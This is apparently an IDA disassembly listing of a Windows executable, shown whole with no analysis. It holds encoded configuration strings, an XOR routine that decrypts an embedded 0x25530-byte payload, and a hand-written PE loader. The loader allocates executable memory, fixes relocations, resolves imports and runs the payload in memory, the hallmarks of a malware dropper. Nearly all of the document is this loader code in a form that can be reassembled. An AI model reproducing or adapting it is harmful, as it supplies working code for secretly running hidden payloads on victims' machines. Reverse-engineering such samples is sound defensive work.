; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 0000F906 (  63750.)
; Section size in file		: 00010000 (  65536.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401005	proc near		; CODE XREF: sub_4019E0+86p
		jmp	sub_401CD0
sub_401005	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40100A	proc near		; CODE XREF: sub_4019E0+8Ep
		jmp	sub_401D70
sub_40100A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40100F	proc near		; CODE XREF: sub_401270+7Fp
		jmp	sub_401200
sub_40100F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

; int __stdcall	sub_401014(int,	DWORD flOldProtect)
sub_401014	proc near		; CODE XREF: sub_401270+9Ep
		jmp	sub_4019E0
sub_401014	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401019	proc near		; CODE XREF: sub_401270+1Fp
		jmp	sub_401980
sub_401019	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40101E	proc near		; CODE XREF: sub_4019E0+22p
		jmp	sub_401ED0
sub_40101E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401023	proc near		; CODE XREF: sub_4019E0+34p
		jmp	sub_401FF0
sub_401023	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401028	proc near		; CODE XREF: sub_401270+BCp
					; sub_40F8F0+3j
		jmp	sub_4019A0
sub_401028	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40102D	proc near		; CODE XREF: sub_401FF0+20p
					; sub_401FF0+51p
		jmp	sub_401FC0
sub_40102D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401032	proc near		; CODE XREF: sub_401270+DEp
		jmp	sub_401B70
sub_401032	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401037	proc near		; CODE XREF: sub_4019E0+67p
		jmp	sub_402090
sub_401037	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40103C	proc near		; CODE XREF: sub_401270+8Bp
		jmp	sub_401B50
sub_40103C	endp

; Exported entry   1. Ip

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401041	proc near		; DATA XREF: .rdata:off_412218o
		jmp	sub_4010A0
sub_401041	endp

; [00000005 BYTES: COLLAPSED FUNCTION WinMain(x,x,x,x).	PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40104B	proc near		; CODE XREF: _WinMain@16_0+481p
		jmp	sub_401270
sub_40104B	endp

; ---------------------------------------------------------------------------
		db 50h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_4010A0	proc near		; CODE XREF: sub_401041j
		push	esi
		push	edi
		push	460h		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	edi, ds:wsprintfA
		mov	esi, eax
		push	offset aXflqwever2lbxk ; "XFlqWEVeR2lBXkcQEBEeRhMTEhIeX1JHIA=="
		push	esi		; LPSTR
		call	edi ; wsprintfA
		lea	eax, [esi+80h]
		push	offset aErixhhaeeb4ria ; "ERIXHhAeEB4RIA=="
		push	eax		; LPSTR
		call	edi ; wsprintfA
		lea	ecx, [esi+100h]
		push	offset aErixhhaeeb4r_0 ; "ERIXHhAeEB4RIA=="
		push	ecx		; LPSTR
		call	edi ; wsprintfA
		lea	edx, [esi+180h]
		push	offset aDefault	; "Default"
		push	edx		; LPSTR
		call	edi ; wsprintfA
		mov	eax, dword_413D78
		lea	edx, [esi+1C0h]
		mov	[esi+244h], eax
		mov	ecx, dword_413D84
		push	offset asc_413CF4 ; "╦"
		push	edx		; LPSTR
		mov	[esi+250h], ecx
		call	edi ; wsprintfA
		mov	eax, dword_413D7C
		push	offset a77b97b8d ; "77B97B8D"
		mov	[esi+248h], eax
		mov	ecx, dword_413D80
		mov	[esi+24Ch], ecx
		mov	dl, byte_413D74
		mov	[esi+240h], dl
		mov	al, byte_413D75
		lea	ecx, [esi+200h]
		mov	[esi+241h], al
		push	ecx		; LPSTR
		call	edi ; wsprintfA
		mov	dl, byte_413F90
		add	esp, 34h
		mov	[esi+45Ch], dl
		mov	ecx, dword_413F88
		xor	eax, eax
		test	cx, cx
		jbe	short loc_40119B
		push	ebx
		mov	ecx, offset dword_413D88
		lea	edx, [esi+254h]

loc_40116F:				; CODE XREF: sub_4010A0+ECj
		mov	di, [ecx]
		inc	eax
		mov	[edx], di
		mov	edi, dword_413F88
		mov	ebx, edi
		add	ecx, 2
		and	ebx, 0FFFFh
		add	edx, 2
		cmp	eax, ebx
		jl	short loc_40116F
		mov	[esi+454h], di
		pop	ebx
		mov	eax, esi
		pop	edi
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_40119B:				; CODE XREF: sub_4010A0+C1j
		mov	[esi+454h], cx
		mov	eax, esi
		pop	edi
		pop	esi
		retn
sub_4010A0	endp

; ---------------------------------------------------------------------------
		align 80h

; =============== S U B	R O U T	I N E =======================================


sub_401200	proc near		; CODE XREF: sub_40100Fj

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_4]
		push	esi
		xor	ecx, ecx
		xor	esi, esi
		test	eax, eax
		jle	short loc_401241
		push	ebx
		mov	ebx, [esp+8+arg_8]
		push	ebp
		push	edi
		mov	edi, [esp+10h+arg_0]

loc_401218:				; CODE XREF: sub_401200+3Cj
		mov	al, [esi+ebx+1]
		mov	dl, [ecx+edi]
		inc	esi
		xor	dl, al
		mov	eax, ecx
		mov	[ecx+edi], dl
		cdq
		mov	ebp, 3
		idiv	ebp
		test	edx, edx
		jnz	short loc_401235
		xor	esi, esi

loc_401235:				; CODE XREF: sub_401200+31j
		mov	eax, [esp+10h+arg_4]
		inc	ecx
		cmp	ecx, eax
		jl	short loc_401218
		pop	edi
		pop	ebp
		pop	ebx

loc_401241:				; CODE XREF: sub_401200+Bj
		pop	esi
		retn
sub_401200	endp

; ---------------------------------------------------------------------------
		db 0Dh dup(90h)
		db 20h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401270	proc near		; CODE XREF: sub_40104Bj

var_28		= byte ptr -28h
var_27		= byte ptr -27h
var_26		= byte ptr -26h
var_24		= byte ptr -24h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		push	0FFFFFFFFh
		push	offset unknown_libname_4 ; Microsoft VisualC 2-11/net runtime
					; MFC 3.1-11.0 32bit
		mov	eax, large fs:0
		push	eax
		mov	large fs:0, esp
		sub	esp, 1Ch
		push	ebx
		push	esi
		push	edi
		lea	ecx, [esp+34h+var_24]
		call	sub_401019
		push	25530h		; unsigned int
		mov	[esp+38h+var_4], 0
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, dword_43339C
		mov	ebx, eax
		mov	eax, ecx
		mov	esi, offset dword_413F9C
		mov	edi, ebx
		add	esp, 4
		shr	ecx, 2
		rep movsd
		mov	ecx, eax
		push	3E8h		; dwMilliseconds
		and	ecx, 3
		rep movsb
		mov	esi, ds:Sleep
		mov	[esp+38h+var_28], 9
		mov	[esp+38h+var_27], 0FDh
		mov	[esp+38h+var_26], 0EFh
		call	esi ; Sleep
		mov	edx, dword_43339C
		lea	ecx, [esp+34h+var_28]
		push	ecx
		push	edx
		push	ebx
		call	sub_40100F
		add	esp, 0Ch
		lea	ecx, [esp+34h+var_24]
		call	sub_40103C
		test	eax, eax
		jnz	short loc_401345
		push	25530h		; flOldProtect
		push	ebx		; int
		lea	ecx, [esp+3Ch+var_24]
		call	sub_401014
		test	eax, eax
		jnz	short loc_401345
		push	ebx
		call	sub_402196
		add	esp, 4
		lea	ecx, [esp+34h+var_24]
		mov	[esp+34h+var_4], 0FFFFFFFFh
		call	sub_401028
		mov	ecx, [esp+34h+var_C]
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		mov	large fs:0, ecx
		add	esp, 28h
		retn
; ---------------------------------------------------------------------------

loc_401345:				; CODE XREF: sub_401270+92j
					; sub_401270+A5j
		mov	eax, [esp+34h+arg_0]
		lea	ecx, [esp+34h+var_24]
		push	eax
		call	sub_401032
		mov	ecx, dword_43D540
		push	ecx
		call	eax
		push	ebx
		call	sub_402196
		add	esp, 8

loc_401365:				; CODE XREF: sub_401270+FCj
		push	1388h		; dwMilliseconds
		call	esi ; Sleep
		jmp	short loc_401365
sub_401270	endp

; ---------------------------------------------------------------------------
		db 2 dup(90h)
		db 40h dup(0CCh)
; [00000496 BYTES: COLLAPSED FUNCTION _WinMain@16_0. PRESS KEYPAD CTRL-"+" TO EXPAND]
		db 0Ah dup(90h)
		db 130h	dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401980	proc near		; CODE XREF: sub_401019j
		mov	eax, ecx
		xor	ecx, ecx
		mov	[eax], ecx
		mov	[eax+8], ecx
		mov	[eax+4], ecx
		retn
sub_401980	endp

; ---------------------------------------------------------------------------
		align 20h

; =============== S U B	R O U T	I N E =======================================


sub_4019A0	proc near		; CODE XREF: sub_401028j
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi], 0
		jz	short loc_4019C4
		mov	eax, [esi+8]
		push	0
		push	0
		push	eax
		call	dword ptr [esi+4]
		mov	ecx, [esi+8]
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	ecx		; lpAddress
		call	ds:VirtualFree

loc_4019C4:				; CODE XREF: sub_4019A0+6j
		pop	esi
		retn
sub_4019A0	endp

; ---------------------------------------------------------------------------
		align 20h

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_4019E0(int,	DWORD flOldProtect)
sub_4019E0	proc near		; CODE XREF: sub_401014j

arg_0		= dword	ptr  4
flOldProtect	= dword	ptr  8

		push	ebx
		push	ebp
		push	esi
		push	edi
		mov	edi, ecx
		mov	eax, [edi+8]
		test	eax, eax
		jz	short loc_4019F6
		pop	edi
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_4019F6:				; CODE XREF: sub_4019E0+Bj
		mov	eax, [esp+10h+flOldProtect]
		mov	ebp, [esp+10h+arg_0]
		push	eax
		push	ebp
		mov	ecx, edi
		call	sub_40101E
		test	eax, eax
		jnz	short loc_401A12
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401A12:				; CODE XREF: sub_4019E0+29j
		mov	ecx, edi
		call	sub_401023
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_401A26
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401A26:				; CODE XREF: sub_4019E0+3Dj
		push	40h		; flProtect
		push	3000h		; flAllocationType
		push	ebx		; dwSize
		push	0		; lpAddress
		call	ds:VirtualAlloc
		mov	esi, eax
		test	esi, esi
		jnz	short loc_401A43
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401A43:				; CODE XREF: sub_4019E0+5Aj
		push	ebp
		push	esi
		mov	ecx, edi
		call	sub_401037
		mov	eax, [edi+10h]
		mov	ecx, [eax+0A0h]
		test	ecx, ecx
		jbe	short loc_401A6B
		mov	ecx, [eax+0A4h]
		test	ecx, ecx
		jbe	short loc_401A6B
		push	esi
		mov	ecx, edi
		call	sub_401005

loc_401A6B:				; CODE XREF: sub_4019E0+77j
					; sub_4019E0+81j
		push	esi
		mov	ecx, edi
		call	sub_40100A
		test	eax, eax
		jnz	short loc_401A8D
		push	8000h		; dwFreeType
		push	eax		; dwSize
		push	esi		; lpAddress
		call	ds:VirtualFree
		pop	edi
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401A8D:				; CODE XREF: sub_4019E0+95j
		lea	ecx, [esp+10h+flOldProtect]
		push	ecx		; lpflOldProtect
		push	40h		; flNewProtect
		push	ebx		; dwSize
		push	esi		; lpAddress
		call	ds:VirtualProtect
		mov	edx, [edi+10h]
		push	0
		push	1
		push	esi
		mov	[edx+34h], esi
		mov	eax, [edi+10h]
		mov	ecx, [eax+28h]
		lea	eax, [ecx+esi]
		mov	[edi+4], eax
		call	eax
		test	eax, eax
		jnz	short loc_401ADD
		push	eax
		push	eax
		push	esi
		call	dword ptr [edi+4]
		push	8000h		; dwFreeType
		push	0		; dwSize
		push	esi		; lpAddress
		call	ds:VirtualFree
		mov	dword ptr [edi+4], 0
		pop	edi
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401ADD:				; CODE XREF: sub_4019E0+D7j
		mov	dword ptr [edi], 1
		mov	[edi+8], esi
		pop	edi
		pop	esi
		pop	ebp
		mov	eax, 1
		pop	ebx
		retn	8
sub_4019E0	endp

; ---------------------------------------------------------------------------
		db 0Eh dup(90h)
		db 50h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401B50	proc near		; CODE XREF: sub_40103Cj
		mov	eax, [ecx]
		retn
sub_401B50	endp

; ---------------------------------------------------------------------------
		db 0Dh dup(90h)
		db 10h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401B70	proc near		; CODE XREF: sub_401032j

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4

		mov	eax, [ecx+10h]
		sub	esp, 10h
		push	ebx
		push	ebp
		mov	ebp, [eax+78h]
		push	esi
		test	ebp, ebp
		push	edi
		jz	loc_401C32
		mov	ebx, [eax+7Ch]
		test	ebx, ebx
		mov	[esp+20h+var_4], ebx
		jz	loc_401C32
		cmp	dword ptr [ecx], 0
		jz	loc_401C32
		mov	edi, [ecx+8]
		mov	esi, [esp+20h+arg_0]
		mov	eax, [edi+ebp+24h]
		mov	ecx, [edi+ebp+1Ch]
		mov	edx, [edi+ebp+18h]
		add	eax, edi
		mov	[esp+20h+var_C], eax
		mov	eax, [edi+ebp+20h]
		add	ecx, edi
		add	eax, edi
		test	esi, 0FFFF0000h
		mov	[esp+20h+var_8], ecx
		jnz	short loc_401BD9
		mov	edx, [edi+ebp+10h]
		mov	eax, 0FFFFh
		sub	eax, edx
		and	eax, esi
		jmp	short loc_401C58
; ---------------------------------------------------------------------------

loc_401BD9:				; CODE XREF: sub_401B70+58j
		test	edx, edx
		mov	[esp+20h+var_10], 0
		jle	short loc_401C32
		mov	edx, eax
		jmp	short loc_401BED
; ---------------------------------------------------------------------------

loc_401BE9:				; CODE XREF: sub_401B70+C0j
		mov	esi, [esp+20h+arg_0]

loc_401BED:				; CODE XREF: sub_401B70+77j
		mov	eax, [edx]
		add	eax, edi

loc_401BF1:				; CODE XREF: sub_401B70+9Fj
		mov	bl, [eax]
		mov	cl, bl
		cmp	bl, [esi]
		jnz	short loc_401C15
		test	cl, cl
		jz	short loc_401C11
		mov	bl, [eax+1]
		mov	cl, bl
		cmp	bl, [esi+1]
		jnz	short loc_401C15
		add	eax, 2
		add	esi, 2
		test	cl, cl
		jnz	short loc_401BF1

loc_401C11:				; CODE XREF: sub_401B70+8Bj
		xor	eax, eax
		jmp	short loc_401C1A
; ---------------------------------------------------------------------------

loc_401C15:				; CODE XREF: sub_401B70+87j
					; sub_401B70+95j
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_401C1A:				; CODE XREF: sub_401B70+A3j
		test	eax, eax
		jz	short loc_401C3E
		mov	eax, [esp+20h+var_10]
		mov	ecx, [edi+ebp+18h]
		inc	eax
		add	edx, 4
		cmp	eax, ecx
		mov	[esp+20h+var_10], eax
		jl	short loc_401BE9

loc_401C32:				; CODE XREF: sub_401B70+Fj
					; sub_401B70+1Ej ...
		pop	edi
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		add	esp, 10h
		retn	4
; ---------------------------------------------------------------------------

loc_401C3E:				; CODE XREF: sub_401B70+ACj
		mov	ecx, [esp+20h+var_10]
		test	ecx, ecx
		jl	short loc_401C32
		mov	edx, [esp+20h+var_C]
		mov	ebx, [esp+20h+var_4]
		xor	eax, eax
		mov	ax, [edx+ecx*2]
		mov	ecx, [esp+20h+var_8]

loc_401C58:				; CODE XREF: sub_401B70+67j
		test	eax, eax
		jl	short loc_401C32
		cmp	eax, [edi+ebp+14h]
		jge	short loc_401C32
		mov	eax, [ecx+eax*4]
		cmp	eax, ebp
		jbe	short loc_401C6F
		add	ebx, ebp
		cmp	eax, ebx
		jb	short loc_401C32

loc_401C6F:				; CODE XREF: sub_401B70+F7j
		add	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		add	esp, 10h
		retn	4
sub_401B70	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)
		db 50h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401CD0	proc near		; CODE XREF: sub_401005j

arg_0		= dword	ptr  4

		mov	eax, [ecx+10h]
		push	ebx
		mov	ebx, [esp+4+arg_0]
		push	esi
		mov	esi, [eax+0A0h]
		mov	eax, [esi+ebx+4]
		add	esi, ebx
		mov	edx, [esi]
		add	edx, eax
		jz	short loc_401D47
		push	ebp
		push	edi

loc_401CED:				; CODE XREF: sub_401CD0+73j
		add	eax, 0FFFFFFF8h
		lea	edi, [esi+8]
		shr	eax, 1
		test	eax, eax
		jle	short loc_401D39
		mov	[esp+10h+arg_0], eax

loc_401CFD:				; CODE XREF: sub_401CD0+67j
		mov	ax, [edi]
		mov	edx, eax
		and	edx, 0F000h
		cmp	dx, 0A000h
		jz	short loc_401D2B
		cmp	dx, 3000h
		jnz	short loc_401D2B
		mov	edx, [esi]
		and	eax, 0FFFh
		add	eax, edx
		mov	edx, [ecx+10h]
		add	eax, ebx
		mov	ebp, ebx
		sub	ebp, [edx+34h]
		add	[eax], ebp

loc_401D2B:				; CODE XREF: sub_401CD0+3Dj
					; sub_401CD0+44j
		mov	eax, [esp+10h+arg_0]
		add	edi, 2
		dec	eax
		mov	[esp+10h+arg_0], eax
		jnz	short loc_401CFD

loc_401D39:				; CODE XREF: sub_401CD0+27j
		add	esi, [esi+4]
		mov	eax, [esi+4]
		mov	edx, [esi]
		add	edx, eax
		jnz	short loc_401CED
		pop	edi
		pop	ebp

loc_401D47:				; CODE XREF: sub_401CD0+19j
		pop	esi
		pop	ebx
		retn	4
sub_401CD0	endp

; ---------------------------------------------------------------------------
		db 4 dup(90h)
		db 20h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401D70	proc near		; CODE XREF: sub_40100Aj

var_104		= dword	ptr -104h
ModuleName	= byte ptr -100h
var_FF		= byte ptr -0FFh
arg_0		= dword	ptr  4

		mov	eax, [ecx+10h]
		sub	esp, 104h
		mov	edx, [eax+80h]
		push	ebx
		push	ebp
		push	esi
		test	edx, edx
		push	edi
		jz	loc_401E69
		mov	ebx, [esp+114h+arg_0]
		add	edx, ebx
		mov	[esp+114h+var_104], edx
		mov	eax, [edx]
		test	eax, eax
		jz	loc_401E69

loc_401DA2:				; CODE XREF: sub_401D70+E5j
		mov	cl, byte_43D544
		lea	esi, [eax+ebx]
		mov	[esp+114h+ModuleName], cl
		mov	ecx, 3Fh
		xor	eax, eax
		lea	edi, [esp+114h+var_FF]
		rep stosd
		mov	ebp, [edx+10h]
		xor	ecx, ecx
		stosw
		stosb
		mov	eax, [edx+0Ch]
		lea	edi, [esp+114h+ModuleName]
		add	eax, ebx
		add	ebp, ebx
		sub	edi, eax

loc_401DD1:				; CODE XREF: sub_401D70+74j
		mov	dl, [eax]
		test	dl, dl
		jz	short loc_401DE6
		mov	[edi+eax], dl
		inc	ecx
		inc	eax
		cmp	ecx, 100h
		jge	short loc_401E5A
		jmp	short loc_401DD1
; ---------------------------------------------------------------------------

loc_401DE6:				; CODE XREF: sub_401D70+65j
		cmp	ecx, 100h
		jge	short loc_401E5A
		lea	edx, [esp+114h+ModuleName]
		mov	[esp+ecx+114h+ModuleName], 0
		push	edx		; lpModuleName
		call	ds:GetModuleHandleA
		mov	edi, eax
		test	edi, edi
		jz	short loc_401E5A
		cmp	dword ptr [esi], 0
		jz	short loc_401E40
		mov	eax, esi
		sub	ebp, esi

loc_401E0D:				; CODE XREF: sub_401D70+CEj
		mov	ecx, [eax]
		mov	eax, [esi]
		test	ecx, 80000000h
		jz	short loc_401E20
		and	eax, 0FFFFh
		jmp	short loc_401E25
; ---------------------------------------------------------------------------

loc_401E20:				; CODE XREF: sub_401D70+A7j
		add	eax, ebx
		add	eax, 2

loc_401E25:				; CODE XREF: sub_401D70+AEj
		push	eax		; lpProcName
		push	edi		; hModule
		call	ds:GetProcAddress
		test	eax, eax
		jz	short loc_401E5A
		mov	[esi+ebp], eax
		mov	ecx, [esi+4]
		add	esi, 4
		test	ecx, ecx
		mov	eax, esi
		jnz	short loc_401E0D

loc_401E40:				; CODE XREF: sub_401D70+97j
		mov	eax, [esp+114h+var_104]
		add	eax, 14h
		mov	[esp+114h+var_104], eax
		mov	eax, [eax]
		test	eax, eax
		jz	short loc_401E69
		mov	edx, [esp+114h+var_104]
		jmp	loc_401DA2
; ---------------------------------------------------------------------------

loc_401E5A:				; CODE XREF: sub_401D70+72j
					; sub_401D70+7Cj ...
		pop	edi
		pop	esi
		pop	ebp
		xor	eax, eax
		pop	ebx
		add	esp, 104h
		retn	4
; ---------------------------------------------------------------------------

loc_401E69:				; CODE XREF: sub_401D70+15j
					; sub_401D70+2Cj ...
		pop	edi
		pop	esi
		pop	ebp
		mov	eax, 1
		pop	ebx
		add	esp, 104h
		retn	4
sub_401D70	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)
		db 50h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401ED0	proc near		; CODE XREF: sub_40101Ej

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_4]
		cmp	edi, 40h
		jnb	short loc_401EE4
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401EE4:				; CODE XREF: sub_401ED0+Aj
		mov	eax, [esp+0Ch+arg_0]
		mov	[ecx+0Ch], eax
		cmp	word ptr [eax],	5A4Dh
		jz	short loc_401EFA
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401EFA:				; CODE XREF: sub_401ED0+20j
		mov	edx, [eax+3Ch]
		lea	esi, [edx+0F8h]
		cmp	edi, esi
		jnb	short loc_401F0F
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401F0F:				; CODE XREF: sub_401ED0+35j
		add	eax, edx
		mov	[ecx+10h], eax
		cmp	dword ptr [eax], 4550h
		jz	short loc_401F24
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401F24:				; CODE XREF: sub_401ED0+4Aj
		mov	dx, [eax+16h]
		test	dh, 20h
		jnz	short loc_401F35
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401F35:				; CODE XREF: sub_401ED0+5Bj
		test	dl, 2
		jnz	short loc_401F42
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401F42:				; CODE XREF: sub_401ED0+68j
		cmp	word ptr [eax+14h], 0E0h
		jz	short loc_401F52

loc_401F4A:				; CODE XREF: sub_401ED0+A6j
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		retn	8
; ---------------------------------------------------------------------------

loc_401F52:				; CODE XREF: sub_401ED0+78j
		lea	esi, [eax+0F8h]
		xor	eax, eax
		mov	[ecx+14h], esi
		mov	ecx, [ecx+10h]
		xor	edx, edx
		mov	ax, [ecx+6]
		test	eax, eax
		jle	short loc_401F80
		lea	ecx, [esi+10h]

loc_401F6D:				; CODE XREF: sub_401ED0+AEj
		mov	esi, [ecx+4]
		mov	ebx, [ecx]
		add	esi, ebx
		cmp	esi, edi
		ja	short loc_401F4A
		inc	edx
		add	ecx, 28h
		cmp	edx, eax
		jl	short loc_401F6D

loc_401F80:				; CODE XREF: sub_401ED0+98j
		pop	edi
		pop	esi
		mov	eax, 1
		pop	ebx
		retn	8
sub_401ED0	endp

; ---------------------------------------------------------------------------
		align 40h

; =============== S U B	R O U T	I N E =======================================


sub_401FC0	proc near		; CODE XREF: sub_40102Dj

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	ecx, [esp+arg_4]
		mov	eax, [esp+arg_0]
		lea	eax, [eax+ecx-1]
		cdq
		idiv	ecx
		imul	eax, ecx
		retn	8
sub_401FC0	endp

; ---------------------------------------------------------------------------
		db 0Bh dup(90h)
		db 10h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_401FF0	proc near		; CODE XREF: sub_401023j

var_4		= dword	ptr -4

		push	ecx
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		mov	eax, [esi+10h]
		cmp	eax, ebx
		jnz	short loc_402004
		pop	esi
		xor	eax, eax
		pop	ebx
		pop	ecx
		retn
; ---------------------------------------------------------------------------

loc_402004:				; CODE XREF: sub_401FF0+Cj
		push	ebp
		mov	ebp, [eax+38h]
		mov	eax, [eax+54h]
		push	edi
		push	ebp
		push	eax
		mov	ecx, esi
		call	sub_40102D
		mov	ecx, [esi+10h]
		mov	edi, eax
		mov	[esp+14h+var_4], ebx
		cmp	[ecx+6], bx
		jbe	short loc_402065

loc_402024:				; CODE XREF: sub_401FF0+73j
		mov	edx, [esi+14h]
		mov	ecx, [ebx+edx+8]
		lea	eax, [ebx+edx]
		mov	edx, [ebx+edx+10h]
		cmp	edx, ecx
		jle	short loc_402038
		mov	ecx, edx

loc_402038:				; CODE XREF: sub_401FF0+44j
		mov	eax, [eax+0Ch]
		push	ebp
		add	eax, ecx
		mov	ecx, esi
		push	eax
		call	sub_40102D
		cmp	edi, eax
		jge	short loc_40204C
		mov	edi, eax

loc_40204C:				; CODE XREF: sub_401FF0+58j
		mov	ecx, [esi+10h]
		mov	eax, [esp+14h+var_4]
		xor	edx, edx
		inc	eax
		mov	dx, [ecx+6]
		add	ebx, 28h
		cmp	eax, edx
		mov	[esp+14h+var_4], eax
		jl	short loc_402024

loc_402065:				; CODE XREF: sub_401FF0+32j
		mov	eax, edi
		pop	edi
		pop	ebp
		pop	esi
		pop	ebx
		pop	ecx
		retn
sub_401FF0	endp

; ---------------------------------------------------------------------------
		db 3 dup(90h)
		db 20h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_402090	proc near		; CODE XREF: sub_401037j

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, ecx
		push	ebx
		xor	ecx, ecx
		mov	ebx, [esp+4+arg_0]
		mov	edx, [eax+10h]
		push	ebp
		push	esi
		mov	esi, [esp+0Ch+arg_4]
		mov	cx, [edx+6]
		mov	edx, [edx+54h]
		push	edi
		mov	edi, ebx
		lea	ecx, [ecx+ecx*4]
		xor	ebp, ebp
		mov	[esp+10h+arg_0], ebp
		lea	ecx, [edx+ecx*8]
		mov	edx, ecx
		shr	ecx, 2
		rep movsd
		mov	ecx, edx
		and	ecx, 3
		rep movsb
		mov	ecx, [eax+10h]
		cmp	[ecx+6], bp
		jbe	short loc_402114

loc_4020CF:				; CODE XREF: sub_402090+82j
		mov	edx, [eax+14h]
		add	edx, ebp
		mov	edi, [edx+0Ch]
		test	edi, edi
		jz	short loc_4020FB
		mov	ecx, [edx+10h]
		test	ecx, ecx
		jz	short loc_4020FB
		mov	esi, [edx+14h]
		mov	edx, [esp+10h+arg_4]
		add	esi, edx
		mov	edx, ecx
		add	edi, ebx
		shr	ecx, 2
		rep movsd
		mov	ecx, edx
		and	ecx, 3
		rep movsb

loc_4020FB:				; CODE XREF: sub_402090+49j
					; sub_402090+50j
		mov	edx, [eax+10h]
		mov	ecx, [esp+10h+arg_0]
		xor	esi, esi
		inc	ecx
		mov	si, [edx+6]
		add	ebp, 28h
		cmp	ecx, esi
		mov	[esp+10h+arg_0], ecx
		jl	short loc_4020CF

loc_402114:				; CODE XREF: sub_402090+3Dj
		mov	[eax+0Ch], ebx
		mov	ecx, [ebx+3Ch]
		add	ecx, ebx
		pop	edi
		mov	[eax+10h], ecx
		add	ecx, 0F8h
		pop	esi
		pop	ebp
		mov	[eax+14h], ecx
		pop	ebx
		retn	8
sub_402090	endp

; ---------------------------------------------------------------------------
		db 90h
		db 28h dup(0CCh)
; ---------------------------------------------------------------------------
		jmp	ds:Sleep
; ---------------------------------------------------------------------------
		jmp	ds:LoadLibraryA
; ---------------------------------------------------------------------------
		jmp	ds:VirtualFree
; ---------------------------------------------------------------------------
		jmp	ds:VirtualProtect
; ---------------------------------------------------------------------------
		jmp	ds:VirtualAlloc
; ---------------------------------------------------------------------------
		jmp	ds:GetProcAddress
; ---------------------------------------------------------------------------
		jmp	ds:GetModuleHandleA
; ---------------------------------------------------------------------------
